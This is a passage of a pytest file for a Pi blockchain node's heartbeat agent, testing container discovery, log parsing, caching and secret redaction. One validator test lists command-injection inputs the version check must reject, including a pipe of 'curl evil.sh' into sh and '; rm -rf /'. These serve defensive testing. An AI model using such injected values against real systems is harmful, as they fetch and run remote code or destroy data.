"""Tests for the node heartbeat agent.

No Docker required -- `run()` is stubbed with real `docker ps` output.
Run with:  pytest pi-agent/test_xl1_heartbeat.py
"""

import json
import re
import time
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

import xl1_heartbeat as agent  # noqa: E402


# Real output from the Pi on 2026-08-22, when the tag had moved off the
# running producer and it showed as a bare image ID.
PS_FULL = (
    "xl1-service-anchor-1\txl1-service:local\tnpx tsx src/server.ts\n"
    "charming_einstein\t3a27a9e5f10d\tnode /opt/xl1/lib/entrypoint.mjs\n"
)


class _StopLoop(Exception):
    """Breaks the worker's forever-loop in a test.

    Not StopIteration raised from a generator expression, which is what this
    was. That construct is version-dependent -- 3.14 lets it through as
    StopIteration while 3.9 converts it to RuntimeError under PEP 479 -- so the
    tests passed here and failed on the runner. A plain exception from a plain
    function behaves the same everywhere.
    """


def _break_loop_after_one_cycle(monkeypatch):
    def stop(_seconds):
        raise _StopLoop
    monkeypatch.setattr(agent.time, "sleep", stop)


def _stub_run(monkeypatch, responses):
    """responses: list of (match_substring, return_value), first match wins."""
    def fake_run(args, timeout=10, **_kw):
        joined = " ".join(args)
        for needle, value in responses:
            if needle in joined:
                return value
        return None
    monkeypatch.setattr(agent, "run", fake_run)


@pytest.fixture(autouse=True)
def _defaults(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "")
    monkeypatch.setattr(agent, "CONTAINER_IMAGE", "xl1:local")
    monkeypatch.setattr(agent, "COMMAND_HINT", "/opt/xl1/")


def test_finds_container_by_image_tag(monkeypatch):
    _stub_run(monkeypatch, [("ancestor=xl1:local", "charming_einstein")])
    assert agent.find_container() == "charming_einstein"


def test_finds_running_container_after_the_image_tag_moved(monkeypatch):
    """The regression: healthy node reported as missing.

    `ancestor=` resolves the tag to an image ID. Once the tag moved off the
    running container, the filter returned nothing and the agent declared a
    perfectly healthy producer missing.
    """
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", ""),   # tag no longer matches
        ("docker ps", PS_FULL),
    ])
    assert agent.find_container() == "charming_einstein"


def test_does_not_mistake_the_sidecar_service_for_the_node(monkeypatch):
    """xl1-service runs beside the node and must never be picked up."""
    only_sidecar = "xl1-service-anchor-1\txl1-service:local\tnpx tsx src/server.ts\n"
    _stub_run(monkeypatch, [("ancestor=xl1:local", ""), ("docker ps", only_sidecar)])
    assert agent.find_container() is None


def test_explicit_name_wins_and_is_verified(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "my-node")
    _stub_run(monkeypatch, [("docker inspect", "abc123")])
    assert agent.find_container() == "my-node"


def test_explicit_name_that_does_not_exist_is_not_invented(monkeypatch):
    monkeypatch.setattr(agent, "CONTAINER", "gone")
    _stub_run(monkeypatch, [])
    assert agent.find_container() is None


def test_no_containers_at_all(monkeypatch):
    _stub_run(monkeypatch, [])
    assert agent.find_container() is None


def test_missing_container_is_reported_not_silently_dropped(monkeypatch):
    _stub_run(monkeypatch, [])
    monkeypatch.setattr(agent, "HEIGHT_URL", "")
    payload = agent.collect()
    assert payload["container_status"] == "missing"
    assert payload["live"] is False


def test_zero_byte_memory_is_reported_as_unavailable(monkeypatch):
    """Pi OS disables the memory cgroup; docker reports 0B, not real zero."""
    _stub_run(monkeypatch, [("docker stats", "0.02%|0B / 3.707GiB")])
    assert agent.container_stats("x")["mem_used_mb"] is None


def test_real_memory_is_parsed(monkeypatch):
    _stub_run(monkeypatch, [("docker stats", "1.50%|412.3MiB / 3.707GiB")])
    stats = agent.container_stats("x")
    assert stats["mem_used_mb"] == 412.3
    assert stats["cpu_percent"] == 1.5


@pytest.mark.parametrize("value,expected", [
    ("0B", 0.0), ("900KiB", 0.9), ("412.3MiB", 412.3),
    ("1.5GiB", 1536.0), ("bogus", None), ("", None),
])
def test_memory_unit_parsing(value, expected):
    assert agent._to_mb(value) == expected


# --- reporting why a container is down --------------------------------------

RUNNING = "running|2026-08-22T13:21:00.9Z|0|xl1:local|0|0001-01-01T00:00:00Z||healthy"
EXITED_CONFIG = "exited|2026-08-20T09:15:00.1Z|0|xl1:local|78|2026-08-20T09:15:04.2Z||"
EXITED_OOM = "exited|2026-08-20T09:15:00.1Z|3|xl1:local|137|2026-08-20T09:20:00.0Z||"


def test_running_container_reports_no_exit_noise(monkeypatch):
    _stub_run(monkeypatch, [("docker inspect", RUNNING)])
    info = agent.container_info("x")
    assert info["container_status"] == "running"
    assert "exit_code" not in info      # 0 here would read as a clean exit
    assert "exited_at" not in info


def test_config_error_exit_is_reported(monkeypatch):
    """Exit 78 is EX_CONFIG -- it failed to start, it did not crash."""
    _stub_run(monkeypatch, [("docker inspect", EXITED_CONFIG)])
    info = agent.container_info("xyo-block-producer")
    assert info["container_status"] == "exited"
    assert info["exit_code"] == 78
    assert info["exited_at"] == "2026-08-20T09:15:04.2Z"


def test_oom_exit_is_distinguishable_from_config_error(monkeypatch):
    _stub_run(monkeypatch, [("docker inspect", EXITED_OOM)])
    info = agent.container_info("x")
    assert info["exit_code"] == 137
    assert info["restart_count"] == 3


def test_named_container_is_tracked_even_while_stopped(monkeypatch):
    """A monitored container that exists but is stopped must still be found.

    Otherwise it reports as 'missing' -- indistinguishable from having been
    deleted, when what you need to know is that it died and why.
    """
    monkeypatch.setattr(agent, "CONTAINER", "xyo-block-producer")
    _stub_run(monkeypatch, [("docker inspect", "sha256:abc")])
    assert agent.find_container() == "xyo-block-producer"


def test_container_error_is_captured(monkeypatch):
    with_error = "exited|2026-08-20T09:15:00Z|0|xl1:local|78|2026-08-20T09:15:04Z|invalid config key|"
    _stub_run(monkeypatch, [("docker inspect", with_error)])
    assert agent.container_info("x")["container_error"] == "invalid config key"


# --- duplicate node containers ----------------------------------------------

PS_TWO_NODES = (
    "keen_bassi\txl1:local\tnode /opt/xl1/lib/entrypoint.mjs\n"
    "xl1-service-anchor-1\txl1-service:local\tdocker-entrypoint.sh\n"
    "charming_einstein\t3a27a9e5f10d\tnode /opt/xl1/lib/entrypoint.mjs\n"
)


def test_lists_every_running_node_container(monkeypatch):
    """Real state from the Pi: a rebuild left two node containers running."""
    _stub_run(monkeypatch, [("docker ps", PS_TWO_NODES)])
    assert agent.list_node_containers() == ["keen_bassi", "charming_einstein"]


def test_sidecar_is_not_counted_as_a_node(monkeypatch):
    _stub_run(monkeypatch, [("docker ps", PS_TWO_NODES)])
    assert "xl1-service-anchor-1" not in agent.list_node_containers()


def test_tagged_container_is_preferred_when_several_run(monkeypatch):
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", "keen_bassi"),
        ("docker ps", PS_TWO_NODES),
    ])
    assert agent.find_container() == "keen_bassi"


# --- docker health state ----------------------------------------------------

def test_health_status_is_captured(monkeypatch):
    raw = "running|2026-08-22T13:21:00Z|0|xl1:local|0|0001-01-01T00:00:00Z||starting"
    _stub_run(monkeypatch, [("docker inspect", raw)])
    assert agent.container_info("x")["health_status"] == "starting"


def test_container_without_a_healthcheck_omits_the_field(monkeypatch):
    raw = "running|2026-08-22T13:21:00Z|0|xl1:local|0|0001-01-01T00:00:00Z||"
    _stub_run(monkeypatch, [("docker inspect", raw)])
    assert "health_status" not in agent.container_info("x")


def test_new_container_name_after_restart_is_found_by_image(monkeypatch):
    """Restarting produces a fresh random name; the image tag does not change."""
    _stub_run(monkeypatch, [("ancestor=xl1:local", "goofy_goldstine")])
    assert agent.find_container() == "goofy_goldstine"


# --- stopped containers must still be identifiable --------------------------

def test_stopped_container_is_found_so_its_exit_code_can_be_reported(monkeypatch):
    """`docker ps` lists running containers only.

    Without an `-a` fallback a stopped node reports as "missing", which is
    indistinguishable from deleted -- and loses the exit code, which is the
    whole point of noticing it stopped.
    """
    # "docker ps -a" first: first match wins, and the broader "docker ps"
    # needle would otherwise swallow the -a call too.
    _stub_run(monkeypatch, [
        ("docker ps -a", "xl1-producer"),             # stopped, still there
        ("docker ps", ""),                            # nothing running
    ])
    assert agent.find_container() == "xl1-producer"


def test_stopped_lookup_ignores_unrelated_containers(monkeypatch):
    """xyo-block-producer runs a different image and sits at exit 78.

    Matching it would report a two-day-old exit code as if it were current.
    """
    def fake_run(args, timeout=10, **_kw):
        joined = " ".join(args)
        if "-a" in args and "ancestor=xl1:local" in joined:
            return ""            # no stopped container of OUR image
        return ""
    monkeypatch.setattr(agent, "run", fake_run)
    assert agent.find_container() is None


def test_running_container_still_wins_over_stopped(monkeypatch):
    _stub_run(monkeypatch, [
        ("ancestor=xl1:local", "xl1-producer"),
        ("docker ps -a", "old-dead-container"),
    ])
    assert agent.find_container() == "xl1-producer"


# --- producer scans are reported once, not replayed -------------------------

def test_producer_scan_is_not_resent_between_cycles(monkeypatch):
    """Re-sending a counted range on every heartbeat is ~30 rejected payloads
    per cycle, and it delays the state changes it is meant to drive."""
    calls = []

    def fake_request(address, params):
        calls.append(params)
        return {"fromBlock": 1, "toBlock": 100, "produced": 2}

    monkeypatch.setattr(agent, "_producer_request", fake_request)
    monkeypatch.setattr(agent, "read_reward_address", lambda _n: "a" * 40)
    monkeypatch.setattr(agent, "PRODUCER_URL", "http://127.0.0.1:8090/producer")
    agent._producer_cache["at"] = 0.0
    agent._producer_cache["value"] = None
    agent._producer_cursor["known"] = True     # backend already heard from

    first = agent.fetch_producer_stats("node")
    second = agent.fetch_producer_stats("node")
    third = agent.fetch_producer_stats("node")

    assert first is not None          # scanned
    assert second is None             # within the interval: nothing new
    assert third is None
    assert len(calls) == 1            # and the service was only asked once


# --- a silent no-op is the hardest fault to notice --------------------------

def _reward_env(monkeypatch, value):
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k:
                        "XL1_NETWORK=sequence\nXL1_REWARD_ADDRESS=%s\nXL1_MNEMONIC=secret words" % value)
    agent._warned.clear()


def test_reward_address_read_from_container(monkeypatch):
    _reward_env(monkeypatch, "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0")
    assert agent.read_reward_address("node") == "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0"


def test_quoted_reward_address_is_accepted(monkeypatch):
    """docker --env-file does not strip quotes; a quoted value must still work."""
    _reward_env(monkeypatch, '"0xd1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0"')
    assert agent.read_reward_address("node") == "0xd1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0"


def test_missing_reward_address_warns_rather_than_failing_silently(monkeypatch, capsys):
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k: "XL1_NETWORK=sequence")
    agent._warned.clear()
    assert agent.read_reward_address("node") is None
    assert "XL1_REWARD_ADDRESS not found" in capsys.readouterr().err


def test_malformed_reward_address_warns(monkeypatch, capsys):
    _reward_env(monkeypatch, "not-an-address")
    assert agent.read_reward_address("node") is None
    assert "not a 20-byte address" in capsys.readouterr().err


def test_warning_is_not_repeated_every_thirty_seconds(monkeypatch, capsys):
    """Once per fault, not 2,880 times a day."""
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "")
    monkeypatch.setattr(agent, "run", lambda *_a, **_k: "XL1_NETWORK=sequence")
    agent._warned.clear()
    for _ in range(5):
        agent.read_reward_address("node")
    assert capsys.readouterr().err.count("XL1_REWARD_ADDRESS not found") == 1


def test_mnemonic_is_never_returned_or_logged(monkeypatch, capsys):
    """The mnemonic sits in the same environment block."""
    _reward_env(monkeypatch, "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0")
    result = agent.read_reward_address("node")
    out = capsys.readouterr()
    assert "secret words" not in str(result)
    assert "secret words" not in out.err + out.out


# --- a restarted agent must not scan blind ----------------------------------

def _producer_ready(monkeypatch, calls):
    monkeypatch.setattr(agent, "PRODUCER_URL", "http://127.0.0.1:8090/producer")
    monkeypatch.setattr(agent, "read_reward_address", lambda _n: "a" * 40)
    monkeypatch.setattr(agent, "_producer_request",
                        lambda addr, params: calls.append(params) or
                        {"fromBlock": 1, "toBlock": 100, "produced": 1})
    agent._producer_cache["at"] = 0.0
    agent._producer_cache["value"] = None
    agent._producer_cursor.update({"block": None, "backfill": None,
                                   "backfill_done": False, "known": False})


def test_no_scan_before_the_backend_has_been_heard_from(monkeypatch):
    """After a restart the cursor is unknown; a guessed range overlaps
    already-counted blocks, is rejected, and burns a 15 minute cycle."""
    calls = []
    _producer_ready(monkeypatch, calls)
    assert agent.fetch_producer_stats("node") is None
    assert calls == []                      # nothing was even requested


def test_scans_once_the_cursor_is_known(monkeypatch):
    calls = []
    _producer_ready(monkeypatch, calls)
    agent._producer_cursor["known"] = True
    agent._producer_cursor["block"] = 565380
    assert agent.fetch_producer_stats("node") is not None
    assert calls[0]["since"] == 565380      # incremental, not a blind window


def test_a_brand_new_node_still_seeds_with_a_window(monkeypatch):
    """known=True with no cursor means the backend has counted nothing yet."""
    calls = []
    _producer_ready(monkeypatch, calls)
    agent._producer_cursor["known"] = True
    assert agent.fetch_producer_stats("node") is not None
    assert "since" not in calls[0]
    assert calls[0]["window"] == agent.PRODUCER_WINDOW


# --- version strings come from outside and are size-capped downstream -------

@pytest.mark.parametrize("value", ["5.2.2", "5.2.2-rc.1", "1.0", "10.20.30.40"])
def test_plausible_versions_accepted(value):
    assert agent._valid_version(value)


@pytest.mark.parametrize("value", [
    "x" * 40,                       # exceeds the backend's 32-char cap
    '5.2.2" && curl evil.sh | sh',  # quote-escape attempt
    "5.2.2; rm -rf /",
    "$(whoami)",
    "", None, 522, "latest",
])
def test_implausible_versions_rejected(value):
    assert not agent._valid_version(value)


def test_over_long_registry_version_is_dropped_not_forwarded(monkeypatch, capsys):
    """A 40-char version would fail the backend's max_length and 422 the whole
    heartbeat -- the node would read OFFLINE and alert, over bad metadata."""
    import io as _io, json as _json

    class _Resp:
        status = 200
        def read(self): return _json.dumps({"version": "x" * 40}).encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    monkeypatch.setattr(agent.urllib.request, "urlopen", lambda *a, **k: _Resp())
    agent._cli_cache.update({"latest": None, "latest_at": 0.0})
    agent._warned.clear()
    assert agent.fetch_cli_latest() is None
    assert "implausible version" in capsys.readouterr().err


# --- the version has to move when the payload does ----------------------------

# Every field the agent can report. This is its entire interface to the
# receiver, and AGENT_VERSION on the operator panel is how someone tells which
# of these to expect from a given Pi.
#
# Pinned as a literal on purpose. The test below re-derives the same set from
# the source, so adding a field breaks it and the person adding it has to come
# here, notice the version note, and bump it.
REPORTED_FIELDS = {
    # Where the operator SAYS this device is. Opt-in, coarse, and verified by
    # nothing -- the names carry that so a renderer cannot forget it.
    "stated_location", "stated_lat", "stated_lon", "stated_radius_km",
    # identity and liveness
    "node_id", "label", "role", "network", "live", "ready", "agent_version", "agent_degraded",
    # How long the node takes to build a block. The budget travels with the
    # figures because it is settable per device, and the sample count travels
    # with them because the node chooses which builds to log -- an average
    # over three is a different claim from one over three hundred.
    "build_samples", "build_ms_avg", "build_ms_max", "build_over_budget",
    "build_budget_ms",
    # Whether the block counts were made against the address this node signs
    # with, or fell back to the reward address because the signer was not
    # known. Never the address itself -- counts only.
    "produced_counting_fallback",
    # How often this node proposes a block, and over how many heights. The
    # pair separates a producer with no slots -- proposing at every height and
    # winning none -- from one having a quiet spell, which "blocks produced: 0"
    # cannot.
    "blocks_attempted", "blocks_attempted_span",
    # The address this node signs blocks with. Public by nature -- it is in
    # every block it produces. The REWARD address is not here and should not
    # be: that is the operator's choice of wallet, not a fact about the node.
    "producer_address",
    "os_updates", "os_security_updates", "os_apt_age_hours", "os_reboot_required",
    "producer_balance_symbol", "producer_balance_raw",
    # stake held against this producer on the backing EVM, and the minimum,
    # both raw -- reported without a verdict about whether it is enough
    "producer_stake_raw", "producer_stake_min_raw",
    # SDK the companion service reads the chain with, and what npm publishes
    "sdk_version", "sdk_latest",
    "peer_count", "produced_share", "peer_window",
    # container
    "container_status", "container_started_at", "container_error", "exit_code",
    "exited_at", "health_status", "image", "restart_count", "running",
    "node_containers",
    # host
    "cpu_percent", "mem_used_mb", "mem_total_mb", "host_mem_used_mb",
    "disk_used_percent", "host_uptime_seconds", "temperature_c",
    # chain
    "chain_heights", "block_height",
    # production counting
    "produced_recent", "produced_window", "pending_transactions",
    "pending_blocks", "last_block_epoch", "scan_from_block", "scan_to_block",
    "scan_produced", "scan_finalized", "finalized_head", "indexer_floor",
    "backfill_from_block", "backfill_to_block", "backfill_produced",
    "scan_minted_by_day",
    "minted_from_block", "minted_to_block", "minted_by_day",
    "last_produced_block", "blocks_since_produced", "explorer_block_url",
    # staying current
    "cli_version", "cli_latest",
    "repo_commit", "repo_upstream", "repo_behind", "repo_tag", "repo_upstream_tag",
    # supervision
    "rebuild_timer_active", "rebuild_timer_next", "producer_unit",
    # eligibility
    "producer_balance", "producer_funded", "producer_blocked",
    # earnings: what production actually paid, as distinct from the balance
    "producer_earned", "producer_blocks_rewarded", "producer_reward_per_block",
    "producer_non_reward", "producer_reward_sdk_ok",
    "node_image_count", "log_tail",
    # The wallet that pays for anchoring. Operator-only on the receiving
    # side; a balance has never been public and this one is not either.
    "attestor_address", "attestor_balance", "attestor_balance_raw",
    "attestor_cost_per_anchor", "attestor_anchor_interval_s",
    # Host vitals. The Pi-only ones are absent elsewhere by design, not by
    # failure: Windows has no load average and no vcgencmd.
    "load_1", "load_5", "load_15", "cpu_cores",
    "swap_used_mb", "swap_total_mb", "disk_free_gb",
    "zram_used_mb", "zram_total_mb", "swapfile_used_mb", "swapfile_total_mb",
    "undervolted_now", "undervolted_ever", "throttled_now", "throttled_ever",
}


def _fields_in_source():
    """Every field name the agent can put in a heartbeat, read from the source.

    Static rather than by calling collect(): most fields only appear on
    branches that need a reachable service, a configured feature or a Linux
    /proc, so a runtime check would pass while covering a fraction of them --
    which is how the first version of this guard passed without testing
    anything.
    """
    import re
    src = (Path(__file__).parent / "xl1_heartbeat.py").read_text(encoding="utf-8")
    # [a-z_0-9] and not [a-z_]. Without the digits this guard could not see
    # load_1, load_5 or load_15 at all -- it reported them as fields that had
    # STOPPED being sent while the agent was sending them perfectly well. A
    # character class missing digits hid a different guard's subject once
    # before; this is the same mistake in a different regex.
    NAME = r"([a-z_0-9]+)"
    keys = set(re.findall(r'payload\["%s"\]' % NAME, src))
    # read_throttling returns a dict that host_metrics merges in, so its keys
    # are heartbeat fields too and nothing else here would find them.
    for fn in ("collect", "container_info", "container_stats", "host_metrics",
               "read_throttling", "read_swap_devices"):
        body = re.search(r"\ndef %s\(.*?(?=\ndef |\Z)" % fn, src, re.S)
        if body:
            keys |= set(re.findall(r'"%s":' % NAME, body.group(0)))
            keys |= set(re.findall(r'(?:info|data|out)\["%s"\]' % NAME, body.group(0)))
    return keys


def test_reported_fields_are_pinned_to_the_version():
    """A new reported field means a new MINOR version.

    AGENT_VERSION is shown on the operator panel to answer "which agent is on
    that Pi". It sat at 1.0.0 through twelve commits and several deploys, so
    the tile read the same before and after every one of them.

    If you are here because this failed: add the field to REPORTED_FIELDS
    above, and raise the MINOR in xl1_heartbeat.py. If you removed one instead,
    that is a MAJOR -- the receiver will stop seeing something it was shown.
    """
    found = _fields_in_source()
    added = found - REPORTED_FIELDS
    gone = REPORTED_FIELDS - found

    assert not added, (
        f"heartbeat gained field(s) {sorted(added)} — add them to "
        "REPORTED_FIELDS and bump the MINOR in AGENT_VERSION"
    )
    assert not gone, (
        f"field(s) {sorted(gone)} are no longer reported — removing one is a "
        "MAJOR bump, since the receiver stops seeing something it was shown"
    )


def test_the_version_is_a_plain_semver():
    """The receiver caps agent_version at 32 characters and the panel prints it
    verbatim, so anything exotic ends up on screen."""
    import re
    assert re.fullmatch(r"\d+\.\d+\.\d+", agent.AGENT_VERSION), agent.AGENT_VERSION


def test_the_version_is_sent_with_every_heartbeat(monkeypatch):
    _stub_run(monkeypatch, [])
    monkeypatch.setattr(agent, "HEIGHT_URL", "")
    assert agent.collect()["agent_version"] == agent.AGENT_VERSION


# --- a null answer is not an answer -------------------------------------------

def test_a_null_balance_is_not_cached(monkeypatch):
    """The service returns 200 with a null balance when it cannot read the
    chain, or when handed an address it will not accept. Treating that as a
    value pins the field blank for the whole interval, long after the cause is
    fixed -- which is how this shipped the first time."""
    calls = []

    class _Resp:
        status = 200
        def __init__(self, body): self._body = body
        def read(self): return self._body.encode()
        def __enter__(self): return self
        def __exit__(self, *a): return False

    bodies = ['{"balance": null, "fundedForProduction": null}',
              '{"balance": 23903.03, "fundedForProduction": true}']

    def fake_urlopen(url, timeout=0):
        calls.append(url)
        return _Resp(bodies[min(len(calls) - 1, len(bodies) - 1)])

    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "a" * 40)
    agent._standing_cache["value"] = None
    agent._standing_cache["at"] = 0.0

    assert agent.fetch_standing("xl1-producer") == agent.NO_STANDING
    # A cached null wouldshort-circuit here and never make a second request.
    assert agent.fetch_standing("xl1-producer") == (23903.03, True, None, None, None, None)
    assert len(calls) == 2, "the null must not have been cached"


def test_a_real_balance_is_cached(monkeypatch):
    """One RPC call per interval, not one per heartbeat."""
    calls = []

    class _Resp:
        status = 200
        def read(self): return b'{"balance": 1.5, "fundedForProduction": true}'
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def fake_urlopen(url, timeout=0):
        calls.append(url)
        return _Resp()

    monkeypatch.setattr(agent.urllib.request, "urlopen", fake_urlopen)
    monkeypatch.setattr(agent, "REWARD_ADDRESS", "0x" + "b" * 40)
    agent._standing_cache["value"] = None
    agent._standing_cache["at"] = 0.0

    assert agent.fetch_standing("xl1-producer") == (1.5, True, None, None, None, None)
    assert agent.fetch_standing("xl1-producer") == (1.5, True, None, None, None, None)
    assert len(calls) == 1, "a real answer should be cached for the interval"


# --- how often it proposes, and over how many heights --------------------------
#
# The pair that separates "no slots" from "a quiet spell". A producer in the
# rotation builds only for its assigned heights -- measured at ~6% on a node
# taking 7.4% of blocks. One that is NOT in the rotation proposes at every
# height and has every proposal discarded. Both look like "blocks produced: 0".

IN_ROTATION = "\n".join([
    "[BlockRunner] Building block 581640",
    "[BlockRunner] [Slow] Generated time payload in 190ms",
    "[BlockRunner] Building block 581648",
    "[BlockRunner] Building block 581657",
])

NO_SLOTS = "\n".join(
    "[BlockRunner] Building block %d" % n for n in range(581672, 581677))


def test_a_node_with_slots_proposes_rarely(monkeypatch):
    _stub_run(monkeypatch, [("docker logs", IN_ROTATION)])
    attempts, span = agent.read_build_attempts("xl1-producer")
    assert attempts == 3
    assert span == 581657 - 581640 + 1          # 18 heights
    # The ratio is the reading, and it is unit-free: no block time, no chain
    # height, no clock.
    assert attempts / span < 0.25


def test_a_node_without_slots_proposes_at_every_height(monkeypatch):
    """Five consecutive heights, five attempts. This is what the Pi 3 does,
    and what no amount of 'blocks produced: 0' could ever have said."""
    _stub_run(monkeypatch, [("docker logs", NO_SLOTS)])
    attempts, span = agent.read_build_attempts("xl1-producer")
    assert (attempts, span) == (5, 5)
    assert attempts / span == 1.0


def test_a_retry_is_still_an_attempt(monkeypatch):
    """The node re-proposes the same height after a validation failure. That
    is a real attempt and it is how a busy height actually looks."""
    _stub_run(monkeypatch, [("docker logs", "\n".join([
        "[BlockRunner] Building block 581672",
        "[BlockRunner] Building block 581672 (retry 1)",
    ]))])
    assert agent.read_build_attempts("xl1-producer") == (2, 1)


def test_a_boot_line_is_not_an_attempt(monkeypatch):
    """"producer in 967ms" is on every start. Counting it would put a node
    that has proposed nothing at one attempt over a span of nothing."""
    _stub_run(monkeypatch, [("docker logs", "[xl1] system ready (producer in 967ms)")])
    assert agent.read_build_attempts("xl1-producer") == (0, 0)


def test_no_attempts_is_a_reading_not_a_silence(monkeypatch):
    """Read the log, found no proposals: nought, reported. Distinct from a log
    that could not be read, which stays None -- the same distinction the build
    times draw, and for the same reason."""
    _stub_run(monkeypatch, [("docker logs", "[BlockRunner] nothing of interest")])
    assert agent.read_build_attempts("xl1-producer") == (0, 0)
    _stub_run(monkeypatch, [])
    assert agent.read_build_attempts("xl1-producer") is None
    assert agent.read_build_attempts(None) is None


def test_attempts_are_counted_from_proposals_not_from_timings(monkeypatch):
    """Deliberately NOT counted from the build-time lines.

    The node prints those only when it judges a build slow, so on a node that
    proposes at every height and is quick about it they would report a handful
    of attempts and hide the very thing this exists to show.
    """
    log = "\n".join(
        ["[BlockRunner] Building block %d" % n for n in range(581672, 581682)]
        + ["[BlockRunner] [Slow] Generated time payload in 190ms"])
    _stub_run(monkeypatch, [("docker logs", log)])
    attempts, span = agent.read_build_attempts("xl1-producer")
    assert attempts == 10, "counted the timing lines instead of the proposals"
    assert span == 10


# --- how long it takes to build a block ---------------------------------------
#
# The only leading indicator on the panel. Blocks produced and share of the
# field both report a decline that has already happened; build time crosses
# the block interval before races start being lost.

BUILD_LOG = "\n".join([
    "[BlockRunner [SimpleBlockRunner]] [Slow] Generated time payload in 190ms",
    "[BlockRunner [SimpleBlockRunner]] Building block 580634",
    "[BlockRunner [SimpleBlockRunner]] [Slow] Generated time payload in 250ms",
    "[BlockRunner [SimpleBlockRunner]] Building block 580635",
    "[BlockRunner [SimpleBlockRunner]] [Slow] Generated time payload in 1200ms",
    "[BlockRunner [SimpleBlockRunner]] Building block 580636",
])


def test_build_times_are_read_from_the_log(monkeypatch):
    _stub_run(monkeypatch, [("docker logs", BUILD_LOG)])
    samples, avg_ms, max_ms, over = agent.read_build_times("xl1-producer")
    assert samples == 3
    assert avg_ms == round((190 + 250 + 1200) / 3)
    assert max_ms == 1200
    # One of the three is past the default 1s budget.
    assert over == 1


def test_the_untagged_line_counts_too(monkeypatch):
    """The node tags these "[Slow]" by its own standard. Keying off the tag
    would silently drop every build it considered fine, so the reading would
    improve the moment the node got faster at deciding what to mention."""
    _stub_run(monkeypatch, [
        ("docker logs", "[BlockRunner] Generated time payload in 42ms"),
    ])
    assert agent.read_build_times("xl1-producer") == (1, 42, 42, 0)


def test_a_stray_millisecond_figure_is_not_a_build(monkeypatch):
    """The log is full of durations. Only this one measures a build, and a
    looser match would average this node's boot time into its build time.

    The answer is a reading of nothing rather than no reading: the log was
    read, and none of what it held was a build.
    """
    _stub_run(monkeypatch, [
        ("docker logs", "\n".join([
            "[xl1] system ready (producer in 7982ms)",
            "[BlockRunner] Building block 569649",
            "connection retry after 500ms",
        ])),
    ])
    assert agent.read_build_times("xl1-producer") == (0, None, None, 0)


def test_an_impossible_figure_is_dropped(monkeypatch):
    """One malformed line must not drag the average somewhere impossible. The
    average is the number an operator acts on; a single bad parse showing 40
    minutes would send them looking for a fault that is not there."""
    _stub_run(monkeypatch, [
        ("docker logs", "\n".join([
            "[BlockRunner] Generated time payload in 200ms",
            "[BlockRunner] Generated time payload in 999999999ms",
        ])),
    ])
    assert agent.read_build_times("xl1-producer") == (1, 200, 200, 0)


def test_no_builds_is_a_reading_of_none(monkeypatch):
    """A node that has built nothing in the window is a real state.

    Nought samples, and no average at all -- deliberately not 0ms, which would
    render as instant builds, the opposite of what happened. A device that is
    up but never selected to produce sits here indefinitely, so this is its
    steady state rather than a gap waiting to fill.
    """
    _stub_run(monkeypatch, [("docker logs", "[BlockRunner] Building block 1")])
    assert agent.read_build_times("xl1-producer") == (0, None, None, 0)


def test_a_log_we_could_not_read_is_not_a_reading(monkeypatch):
    """And this is the case that must stay None.

    run() answers None when the container is gone, docker refuses us, or the
    call times out. Reporting nought builds there would state something about
    the node on the strength of not having been able to ask it -- and it would
    be indistinguishable from the honest zero above.
    """
    _stub_run(monkeypatch, [])            # nothing matches: run() -> None
    assert agent.read_build_times("xl1-producer") is None
    assert agent.read_build_times(None) is None


def test_an_empty_log_is_a_reading(monkeypatch):
    """Empty is not the same as unavailable. docker answering with an empty
    log is an answer; only run() returning None is a failure to ask."""
    _stub_run(monkeypatch, [("docker logs", "")])
    assert agent.read_build_times("xl1-producer") == (0, None, None, 0)


def test_the_build_window_is_bounded(monkeypatch):
    """A slow build last Tuesday is not a current fault, for the same reason
    the eligibility scan is windowed."""
    seen = []

    def fake_run(args, timeout=10, **_kw):
        seen.append(args)
        return ""

    monkeypatch.setattr(agent, "run", fake_run)
    agent.read_build_times("xl1-producer")
    assert "--since" in seen[0], seen[0]
    assert agent.BUILD_WINDOW in seen[0]


def test_stderr_is_merged_for_build_lines(monkeypatch):
    """The node splits its output across both streams. Reading one halves the
    sample without saying so."""
    seen = {}

    def fake_run(args, timeout=10, merge_stderr=False, **_kw):
        seen["merge"] = merge_stderr
        return ""

    monkeypatch.setattr(agent, "run", fake_run)
    agent.read_build_times("xl1-producer")
    assert seen["merge"] is True


def test_the_budget_travels_with_the_figures(monkeypatch):
    """The panel must not hard-code a budget of its own: it is settable per
    device, and a fixed line at the far end would draw one node's builds
    against another node's threshold."""
    monkeypatch.setattr(agent, "BUILD_BUDGET_MS", 100)
    _stub_run(monkeypatch, [("docker logs", BUILD_LOG)])
    _samples, _avg, _max, over = agent.read_build_times("xl1-producer")
    assert over == 3


# --- which address production is counted against ------------------------------
#
# The wizard asks where rewards should be paid and says "usually that wallet's
# own address", so pointing them at a separate wallet is ordinary. Blocks carry
# the SIGNING address, and counting against the reward one then finds nothing
# for ever -- reported as "no blocks seen yet" across 100% of chain history,
# which is a confident wrong answer rather than a missing one.

# Synthetic, like every other address in this file. The real one was
# briefly here after being read off a live node, which is exactly how a
# producer's address ends up in a public repository.
SIGNER = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"
REWARD = "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0"
STAKE_LOG = "[xl1-producer] Producer %s has insufficient stake." % SIGNER


def _forget_signer(monkeypatch, tmp_path):
